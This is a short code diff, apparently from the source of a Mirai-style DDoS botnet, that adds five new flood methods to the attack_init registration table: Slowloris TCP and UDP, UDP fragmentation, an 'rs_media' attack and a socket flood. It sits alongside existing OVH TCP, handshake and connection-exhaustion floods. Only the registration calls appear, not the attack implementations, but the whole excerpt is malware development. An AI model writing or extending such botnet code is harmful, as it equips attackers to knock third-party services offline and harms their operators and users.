@@ -39,6 +39,11 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_OVHTCP, (ATTACK_FUNC)attack_method_ovhtcp);
     add_attack(ATK_VEC_TCP_HANDSHAKE, (ATTACK_FUNC)attack_tcp_handshake);
     add_attack(ATK_VEC_CONN_EXHAUST, (ATTACK_FUNC)attack_tcp_connexhaust);
+    add_attack(ATK_VEC_SLOWLORIS_TCP, (ATTACK_FUNC)attack_slowloris_tcp);
+    add_attack(ATK_VEC_SLOWLORIS_UDP, (ATTACK_FUNC)attack_slowloris_udp);
+    add_attack(ATK_VEC_UDP_FRAG, (ATTACK_FUNC)attack_udp_frag);
+    add_attack(ATK_VEC_RS_MEDIA, (ATTACK_FUNC)attack_rs_media);
+    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket_flood);
     return TRUE;
 }
 
